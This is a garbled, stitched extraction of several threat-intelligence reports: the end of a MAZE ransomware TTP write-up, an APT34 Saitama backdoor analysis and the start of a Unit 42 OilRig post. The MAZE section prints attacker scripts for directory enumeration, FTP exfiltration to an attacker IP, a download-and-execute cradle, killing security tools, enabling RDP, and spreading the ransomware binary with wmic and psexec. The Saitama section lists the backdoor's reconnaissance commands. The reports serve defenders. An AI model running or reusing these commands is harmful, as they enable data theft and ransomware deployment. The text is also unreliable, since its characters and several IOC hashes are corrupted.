T1071: Standard Application Layer Protocol T1032: Standard Cryptographic Protocol T1020: Automated Ex%ltration Ex""ltration T1002: Data Compressed T1048: Ex%ltration Over Alternative Protocol Impact T1486: Data Encrypted for Impact MAZE Group 3 MITRE ATT&CK Mapping (FIN6) ATT&CK Tactic Category Techniques T1133: External Remote Initial Access Services T1078: Valid Accounts https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 29 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 T1059: Command-Line Inte'ace Execution T1086: PowerShell T1064: Scripting T1035: Service Execution T1078: Valid Accounts T1031: Modify Existing Service Persistence Privilege Escalation T1055: Process Injection T1078: Valid Accounts T1055: Process Injection T1078: Valid Accounts T1116: Code Signing T1089: Disabling Security Tools T1202: Indirect Command Execution T1112: Modify Registry T1027: Obfuscated Files Defense Evasion https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 30 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 or Information T1108: Redundant Access T1064: Scripting Credential T1003: Credential Access Dumping T1087: Account Discovery T1482: Domain Trust Discovery Discovery T1083: File and Directory Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery T1097: Pass the Ticket T1076: Remote Desktop Protocol T1105: Remote File Copy Lateral Movement https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 31 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Collection T1077: Windows Admin Shares T1074: Data Staged T1039: Data from Network Shared Drive T1043: Commonly Used Po$ T1219: Remote Access Tools Command T1105: Remote File Copy and Control T1071: Standard Application Layer Protocol T1032: Standard Cryptographic Protocol Ex""ltration T1002: Data Compressed T1486: Data Encrypted for Impact Impact T1490: Inhibit System Recovery T1489: Service Stop https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 32 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Example Commands Observed in MAZE Ransomware Incidents function Enum-UsersFolders($PathEnum) { $foldersArr = 'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local' Get-ChildItem -Path $PathEnum'/c$' -ErrorAction SilentlyContinue Get-ChildItem -Path $PathEnum'/c$/Program Files' -ErrorAction SilentlyContinue Get-ChildItem -Path $PathEnum'/c$/Program Files (x86)' -ErrorAction SilentlyContinue foreach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction SilentlyContinue) { foreach($SeachDir in $foldersArr) { Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction SilentlyContinue } } } PowerShell reconnaissance script used to enumerate directories $Dir=""C:/Windows/Temp/"" #ftp server $ftp = ""ftp://<IP Address>/incoming/"" $user = ""<username>"" $pass = ""<password>"" $webclient = New-Object System.Net.WebClient $webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass) #list every sql server trace file foreach($item in (dir $Dir ""*.7z"")){ ""Uploading $item..."" $uri = New-Object System.Uri($ftp+$item.Name) $webclient.UploadFile($uri, $item.FullName) https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 33 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 } Decoded FTP upload PowerShell script powershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:43984/'); Add-FtpFile -ftpFilePath ""ftp://<IP Address>/cobalt_uploads/<file name>"" -localFile ""<local file path>\ <file name> "" -userName ""<username>"" -password ""<password>"" Decoded FTP upload PowerShell script […] echo 7 echo 7 taskkill /im csrss_tc.exe /f taskkill /im kwsprod.exe /f taskkill /im avkwctl.exe /f taskkill /im rnav.exe /f taskkill /im crssvc.exe /f sc config CSAuth start= disabled taskkill /im vsserv.exe /f taskkill /im ppmcativedetection.exe /f […] taskkill /im sahookmain.exe /f taskkill /im mcinfo.exe /f reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f netsh advfirewall firewall set rule group=""remote desktop"" new enable=Ye c:\windows\temp\sss.exe Excerpt from windows.bat kill script start copy sss.exe \\<internal IP>\c$\windows\temp\ https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 34 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 start copy sss.exe \\<internal IP>\c$\windows\temp\ start copy windows.bat \\<internal IP>\c$\windows\temp\ start copy windows.bat \\<internal IP>\c$\windows\temp\ start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""c:\windows\temp\sss.exe"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""c:\windows\temp\sss.exe"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c c:\windows\temp\windows.bat"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c c:\windows\temp\windows.bat"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"" start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.bat start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.bat Example commands from MAZE distribution scripts @echo off del done.txt del offline.txt rem Loop thru list of computer names in file specified on command-line for /f %%i in (%1) do call :check_machine %%i https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 35 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 goto end :check_machine rem Check to see if machine is up. ping -n 1 %1|Find ""TTL="" >NUL 2>NUL if errorlevel 1 goto down echo %1 START cmd /c ""copy [Location of MAZE binary] \\%1\c$\windows\temp && exit"" timeout 1 > NUL echo %1 >> done.txt rem wmic /node:""%1"" process call create ""regsvr32.exe /i C:\windows\temp\[MAZE binary name]"" >> done.txt START """" cmd /c ""wmic /node:""%1"" process call create ""regsvr32.exe /i C:\windows\temp\[MAZE binary name]"" && exit"" goto end :down rem Report machine down echo %1 >> offline.txt :end Example MAZE distribution script Indicators of Compromise 064058cf092063a5b69ed8fd2a1a04fe 0f841c6332c89eaa7cac14c9d5b1d35b 108a298b4ed5b4e77541061f32e55751 11308e450b1f17954f531122a56fae3b https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 36 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 15d7dd126391b0e7963c562a6cf3992c 21a563f958b73d453ad91e251b11855c 27c5ecbb94b84c315d56673a851b6cf9 2f78&32cbb3c478865a88276248d419 335aba8d135cc2e66549080ec9e8c8b7 3bfcba2dd05e1c75f86c008f4d245f62 46b98ee908d08f15137e509e5e69db1b 5774f35d180c0702741a46d98190&37 5df79164b6d0661277f11691121b1d53 658e9deec68cf5d33ee0779f54806cc2 65cf08&af12e47de8cd37098aac5b33 79d137d91be9819930eeb3876e4)e79 8045b3d2d4a6084f14618b028710ce85 8205a1106ae91d0b0705992d61e84ab2 83b8d994b989f6cbeea3e1a5d68ca5d8 868d604146e7e5cb5995934b085846e3 87239ce48fc8196a5ab66d8562f48f26 89e1ddb8cc86c710ee068d6c6bf300f4 https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 37 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Maze Payloads 910aa49813ee4cc7e4fa0074db5e454a 9eb13d56c363df67490bcc2149229e4c a0c5b4adbcd9eb6de9d32537b16c423b a3a3495ae2fc83479baeaf1878e1ea84 b02be7a336dcc6635172e0d6ec24c554 b40a9eda37493425782bda4a3d9dad58 b4d6cb4e52bb525ebe43349076a240df b6786f141148925010122819047d1882 b93616a1ea4f4a131cc0507e6c789f94 bd9838d84fd77205011e8b0c2bd711e0 be537a66d01c67076c8491b05866c894 bf2e43&8542e73c1b27291e0df06afd c3ce5e8075f506e396ee601f2757a2bd d2dda72&2)bb89bd871c5fc21ee96a d3eaab616883fcf51dcbdb4769dd86df d552be44a11d831e874e05cadafe04b6 deebbea18401e8b5e83c410c6d3a8b4e dfa4631ec2b8459b1041168b1b1d5105 https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 38 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 e57ba11045a4b7bc30bd2d33498ef194 e69a8eb94f65480980deaf1&5a431a6 ef95c48e750c1a3b1af8f5446fa04f54 f04d404d84be66e64a584d425844b926 f457bb5060543db3146291d8c9ad1001 f5ecda7dd8bb1c514f93c09cea8ae00d f83cef2bf33a4d43e58b771e81af3ecc )a4cbb7167176990d5a8d24e9505f71 91.218.114.11 91.218.114.25 91.218.114.26 91.218.114.31 91.218.114.32 91.218.114.37 91.218.114.38 91.218.114.4 91.218.114.77 https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 39 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Maze Check-in IPs 91.218.114.79 92.63.11.151 92.63.15.6 92.63.15.8 92.63.17.245 92.63.194.20 92.63.194.3 92.63.29.137 92.63.32.2 92.63.32.52 92.63.32.55 92.63.32.57 92.63.37.100 92.63.8.47 aoacugmutagkwctu[.]onion Maze- related Domains mazedecrypt[.]top mazenews[.]top https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 40 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Maze Download URLs newsmaze[.]top h!p://104.168.174.32/wordupd_3.0.1.tmp h!p://104.168.198.208/wordupd.tmp h!p://104.168.201.35/dospizdos.tmp h!p://104.168.201.47/wordupd.tmp h!p://104.168.215.54/wordupd.tmp h!p://149.56.245.196/wordupd.tmp h!p://192.119.106.235/mswordupd.tmp h!p://192.119.106.235/o""ceupd.tmp h!p://192.99.172.143/winupd.tmp h!p://54.39.233.188/win163.65.tmp h!p://91.208.184.174:8079/windef.exe h!p://agenziainformazioni[.]icu/wordupd.tmp h!p://www.download- invoice[.]site/Invoice_29557473.exe 1a26c9b6ba40e4e3c3dce12de266ae10 53d5bdc6bd7904b44078cf80e239d42b 79271dc08052480a578d583a298951c5 https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 41 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Malicious a2d631fcb08a6c840c23a8f46f6892dd Documents ad30987a53b1b0264d806805ce1a2561 c09af442e8c808c953f4fa461956a30f ee26e33725b14850b1776a67bd8f2d0a BEACON C2s 173.209.43.61 193.36.237.173 37.1.213.9 37.252.7.142 5.199.167.188 checkso""ce[.]me drivers.updatecenter[.]icu plaintsotherest[.]net thesawmeinrew[.]net updates.updatecenter[.]icu 7507fe19a)da652e9b2768c10ad639f a93b86b2530cc988f801462ead702d84 4f57e35a89e257952c3809211bef78ea https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 42 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Cobalt Strike Binaries bad6fc87a98d1663be0df23aedaf1c62 f5ef96251f183f7fc63205d8ebf30cbf c818cc38f46c604f8576118f12fd0a63 078cf6db38725c37030c79ef73519c0c c255daaa8abfadc12c9ae8ae2d148b31 1fef99f05bf5ae78a28d521612506057 cebe4799b6a&9cead533536b09fecd1 4ccca6&9b667a01df55326fcc850219 bad6fc87a98d1663be0df23aedaf1c62 Meterpreter C2s 5.199.167.188 Other Related Files 3A5A9D40D4592C344920DD082029B362 (related script) 76f8f28bd51efa03ab992fdb050c8382 (MAZE execution a$ifact) b5aa49c1bf4179452a85862ade3ef317 (windows.bat kill script) fad3c6914d798e29a3fd8e415f1608f4 (related script) https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 43 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 27304b246c7d5b4e149124d5f93c5b01 (PsExec) 42badc1d2f03a8b1e4875740d3d49336 (7zip) 75b55bb34dac9d02740b9ad6b6820360 (PsExec) 9b02dd2a1a15e94922be3f85129083ac (AdFind) c621a9f931e4ebf37dace74efcce11f2 (SMBTools) f413b4a2242bb60829c9a470eea4d)6 (winRAR) a!-customer[.]com a!-information[.]com a!-newsroom[.]com a!-plans[.]com bezahlen-1und1[.]icu bzst-info[.]icu bzst-inform[.]icu bzstinfo[.]icu Tools & Utilities Email Sender Domains https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 44 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 bzstinform[.]icu canada-post[.]icu canadapost-delivery[.]icu canadapost-tracking[.]icu hilfe-center-1und1[.]icu hilfe-center-internetag[.]icu trackweb-canadapost[.]icu Sender Domain Registrant Addresses abusereceive@hitler.rocks gladko&1991@yandex.ru Mandiant Threat Intelligence will host an exclusive webinar on Thursday, May 21, 2020, at 8 a.m. PT / 11 a.m. ET to provide updated insight and information into the MAZE ransomware threat, and to answer questions from a!endees. Register today to reserve your spot. Posted in Threat Intelligence—Security & Identity Related articles https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 45 di 47"
oilrig,cti-hal,85a1f0485230,G0049,"APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 Home > Blog Categories Breaches Product News Ransomware Threat Intelligence Vulnerabilities THREAT INTELLIGENCE APT34 targets Jordan Government using new Saitama backdoor Posted: May 10, 2022 by Threat Intelligence Team On April 26th, we identiCed a suspicious email that targeted a government oFcial from Jordan’s foreign ministry. The email contained a malicious Excel document that drops a new backdoor named Saitama. Following our investigation, we were able to attribute this attack to the known Iranian Actor APT34. Also known as OilRig/COBALT GYPSY/IRN2/HELIX KITTEN, APT34 is an Iranian threat group that has targeted Middle Eastern countries and victims https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 1 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 worldwide since at least 2014. The group is known to focus on the Cnancial, governmental, energy, chemical, and telecommunication sectors. In this blog post, we describe the attack ]ow and share details about the Saitama backdoor. Malicious email Dle The malicious email was sent to the victim via a Microsoft Outlook account with the subject “ConCrmation Receive Document” with an Excel Cle called “ConCrmation Receive Document.xls”. The sender pretends to be a person from the Government of Jordan by using its coat of arms as a signature. Excel document The Excel attachment contains a macro that performs malicious activities. The document has an image that tries to convince the victim to enable a macro. https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 2 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 After enabling the macro, the image is replaced with the Jordan government’s the coat of the arms: The macro has been executed on WorkBook_Open(). Here are the main functionalities of this macro: https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 3 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 Hides the current sheet and shows the new sheet that contains the coat of arms image. Calls the “eNotif’ function which is used to send a notiCcation of each steps of macro execution to its server using the DNS protocol. To send a notiCcation it builds the server domain for that step that contains the following parts: “qw” + identiCcation of the step (in this step “zbabz”) + random number + domain name (joexpediagroup.com)=qwzbabz7055.joexpediagroup.com. Then it uses the following WMI query to get the IP address of the request: Select * From Win32_PingStatus Where Address=’” & p_sHostName & “‘” which performs the DNS communication the the created subdomain. Creates a TaskService object and Gets the task folder that contains the list of the current tasks Calls ENotif function https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 4 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 Checks if there is a mouse connected to PC and if that is the case performs the following steps Creates %APPDATA%/MicrosoftUpdatedirectory Creates “Update.exe”, “Update.exe.conCg” and “Microsoft.Exchange.WenServices.dll” Reads the content of the UserForm1.label1, UserForm2.label1 and UserForm3.label1 that are in base64 format, decodes them and Cnally writes them into the created Cles in the previous step Calls a ENotif function for each writes function Checks the existence of theUpdate.exeCle and if for some reason it has not been written to disk, it writes it using a technique that loads a DotNet assembly directly using mscorlib and Assembly.Load by manually accessing the VTable of the IUnknown. This technique was taken from Github (link). Even though, this technique was not used in this macro since the Cle was already written, the function name (“Test”) suggests that the threat actor is trying to implement this technique in future attacks. Finally, it calls the ENotif function. https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 5 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 DeCnes a xml schema for a scheduled task and registers it using the RegisterTask function. The name of the scheduled task is MicrosoftUpdate and is used to make update.exepersistent. https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 6 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 Saitama Backdoor – A Dnite state machine The dropped payload is a small backdoor that is written in .Net. It has the following interesting pdb path: E:SaitamaSaitama.AgentobjReleaseSaitama.Agent.pdb. Saitama backdoor abuses the DNS protocol for its command and control communications. This is stealthier than other communication methods, such as HTTP. Also, the actor cleverly uses techniques such as compression and long random sleep times. They employed these tricks to disguise malicious traFc in between legitimate traFc. https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 7 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 Another element that we found interesting about this backdoor is the way that it is implemented. The whole ]ow of the program is deCned explicitly as a Cnite-state machine, as shown in the Figure 7. In short, the machine will change its state depending on the command sent to every state. Graphically, the program ]ow can be seen as this: https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 8 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 BEGIN It is the initial state of the machine. It just accepts the start command that puts the machine into the ALIVE state. ALIVE This state fetches the C&C server, expecting to receive a command from the attackers. These servers are generated by using the PRNG algorithm that involves transformations like the Mersenne Twister. These transformations will generate subdomains of the hard coded domains in the ConCg class (Figure 8). https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 9 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 Figure 9 shows an example of the generated subdomain: This state has two possible next stages. If the performed DNS request fails, the next stage is SLEEP. Otherwise, the next stage is RECEIVE. SLEEP and SECOND SLEEP These states put the backdoor in sleep mode. The amount of time that the program will sleep is determined by the previous stage. It is clear that one of the main motivations of the actor is to be as stealthy as possible. For example, unsuccessful DNS requests puts the backdoor in sleep mode for a time between 6 and 8 hours! There are different sleep times depending on the situations (values are expressed in milliseconds): There is also a “Second Sleep” state that puts the program on sleep mode a different amount of time. https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 10 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 RECEIVE This state is used to receiving commands from the C&C servers. Commands are sent using the IP address Celd that is returned by the DNS requests. Further details about the communication protocol are provided later in this report. In a nutshell, every DNS request is capable of receiving 4 bytes. The backdoor will concatenate responses, building buffers in that way. These buffers will contain the commands that the backdoor will execute. DO (DoTask) That state will execute commands received from the server. The backdoor has capabilities like executing remote pre-established commands, custom commands or dropping Dles. The communication supports compression, also. The following Cgure shows the list of possible commands that can be executed by the backdoor. ID Type Command 1 PS Get-NetIPAddress -AddressFamily IPv4 | Select- Object IPAddress 2 PS Get-NetNeighbor -AddressFamily IPv4 | Select- Object “IPADDress” CMD whoami PS [System.Environment]::OSVersion.VersionString CMD net user 3 4 5 https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 11 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 6 7 — ———[NOT USED]——— PS Get-ChildItem -Path “C:Program Files” | Select- Object Name 8 PS Get-ChildItem -Path ‘C:Program Files (x86)’ | Select-Object Name 9 PS Get-ChildItem -Path ‘C:’ | Select-Object Name 10 CMD hostname 11 PS Get-NetTCPConnection | Where-Object{$_.State - eq “Established”} | Select-Object “LocalAddress”, “LocalPort”, “RemoteAddress”, “RemotePort” 12 PS $(ping -n 1 10.65.4.50 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.4.51 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.65.65 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.53.53 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.21.200 | Cndstr /i ttl) -eq $null 13 PS nslookup ise-posture.mofagov.gover.local | Cndstr /i Address;nslookup webmail.gov.jo | Cndstr /i Address 14 PS $(ping -n 1 10.10.21.201 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.19.201 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.19.202 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.24.200 | Cndstr /i ttl) -eq $null 15 PS $(ping -n 1 10.10.10.4 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.50.10 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.22.50 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.45.19 | Cndstr /i ttl) -eq $null 16 PS $(ping -n 1 10.65.51.11 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.6.1 | Cndstr /i ttl) -eq https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 12 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 $null;$(ping -n 1 10.65.52.200 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.6.3 | Cndstr /i ttl) -eq $null 17 PS $(ping -n 1 10.65.45.18 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.28.41 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.36.13 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.51.10 | Cndstr /i ttl) -eq $null 18 PS $(ping -n 1 10.10.22.42 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.23.200 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.45.19 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.10.19.50 | Cndstr /i ttl) -eq $null 19 PS $(ping -n 1 10.65.45.3 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.4.52 | Cndstr /i ttl) -eq $null;$(ping -n 1 10.65.31.155 | Cndstr /i ttl) -eq $null;$(ping -n 1 ise-posture.mofagov.gover.local | Cndstr /i ttl) -eq $null 20 PS Get-NetIPConCguration | Foreach IPv4DefaultGateway | Select-Object NextHop 21 PS Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object SERVERAddresses 22 CMD systeminfo | Cndstr /i “Domain” Figure 12: List of predeCned commands It is pretty shocking to see that even when attackers have the possibility of sending any command, they choose to add that predeCned list in the backdoor in Base64 format. As we can see, some of them are common reconnaissance snippets, but some of them are not that common. In fact, some of the commands https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 13 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 contain internal IPsand also internal domain names(like ise-posture.mofagov.gover.local). That shows that this malware was clearly targeted and also indicates that the actor has some previous knowledge about the internal infrastructure of the victim. SEND – SEND AND RECEIVE The Send state is used to send the results generated by commands to the actor’s server. In this case, the name of the subdomain will contain the data. As domain names are used to exCltrate unknown amounts of data, attackers had to split this data in different buffers. Every buffer is then sent through a different DNS request. As it can be seen in the Figure 12, all the required information in order to reconstruct original data is sent to the attackers. The size of the buffer is only sent in the Crst packet. Products Pricing Partners Resources Support Get a quote Buy now Attribution There are several indicators that suggest that this campaign has been operated by APT34. Maldoc similarity: The madoc used in this campaign shared some similarities with maldocs used in previous campaigns of this actor. More https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 14 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 speciCcally similar to what was mentioned in CheckPoint’s reportthis maldoc registers a scheduled task that would launch the executable every X minutes, also it uses the same anti sandboxing technique (checking if there is a mouse connected to the PC or not). Finally, we see a similar pattern to beacon back to the attacker server and inform the attacker about the current stage of execution. Victims similarity: The group is known to target the government of Jordan and this is the case in this campaign. Payload similarity: DNS is the most common method used byAPT34 for its C&C communications. The group is also known to use uncommon encodings such as Base32 and Base36 in its previous campaigns. The Saitama backdoor uses a similar Base32 encoding for sending data to the servers that is used by DNSpionage. Also, to build subdomains it uses Base32 encoding that is similar to what was reported by Mandiant. Malwarebytes customers are protected from this attack via our Anti-Exploit layer. https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 15 di 17 APT34 targets Jordan Government using new Saitama backdoor 08/08/24, 11:29 IOCs Maldoc: ConCrmation Receive Document.xls 26884f872f4fae13da21fa2a24c24e963ee1eb66da47e270246d6d9dc7204c2b Saitama backdoor: update.exe e0872958b8d3824089e5e1cfab03d9d98d22b9bcb294463818d721380075a52d C2s: uber-asia.com asiaworldremit.com joexpediagroup.com Related articles THREAT INTELLIGENCE RANSOMWARE THREAT INTELLIGENCE New phishing campaign uses Discord for… payload delivery  3 minutes Ransomware WorkersDevBackdoor review: July 2024 and MadMxShell  3 minutes converge in… malvertising  7 minutes campaigns https://www.threatdown.com/blog/apt34-targets-jordan-government-using-new-saitama-backdoor/ Pagina 16 di 17"
oilrig,cti-hal,658dba574313,G0049,"Behind the Scenes with OilRig 08/08/24, 11:29 About Unit 42 Services Unit 42 Threat Research Partners Resources Under Attack? Threat Research Center Threat Actor Groups Malware M A L W A R E Behind the Scenes with OilRig 24 min read By: Bryan Lee , Robert Falcone Published: 30 April, 2019 at 6:00 AM PDT Categories: Malware , Nation-State Cyberattacks , Threat Actor Groups , Threat Research Tags: BONDUPDATER , Evasive Serpens , OilRig , OopsIE , TwoFace Share Table of Contents This post is also available in: 日本語 (Japanese) After ﬁrst uncovering the OilRig group in May 2016, Unit 42 has continued to monitor, observe, and track their activities and evolution over time. Since then, OilRig has been heavily researched by the rest of the industry and has been given additional names such as APT34 and Helix Kitten. The OilRig group is not particularly sophisticated but is extremely persistent in the pursuit of their mission objective and, unlike other some other espionage motivated adversaries, are much more willing to deviate from their existing attack methodologies and use novel techniques to accomplish their objectives. Over time, through our research we have been able to reveal speciﬁc details of how their attacks are executed, the tools they use, and even what their development cycle may be like by tracking their use of VirusTotal as a detection check system. Due to the nature of the data we had access to however, our perspective was primarily from a target or victim perspective which is generally limited to the artifacts at the time of attack. Recently, a data dump was leaked and made available to the public claiming to be data in relation to OilRig activity from the operations side. We retrieved the data dump, which included credential dumps, backdoors, webshells, and other ﬁles of interest. Several media outlets and other researchers have since performed their own evaluation, and in our assessment, we found the artifacts contained in data dump are indeed consistent with known OilRig operations and toolsets. In addition, the data dump allowed us to retroactively compare our previous research with OilRig’s operational data. This allowed us to ﬁll in previously existing gaps of OilRig’s attack life cycle in addition to validating the accuracy of our research. By analyzing the data dump, we have been able to identify exactly how the BONDUPDATER backdoor and its server component functions, the appearance and functionality of several webshells in deployment by OilRig, each of these tools’ internal operational names, and a better understanding of how widespread the 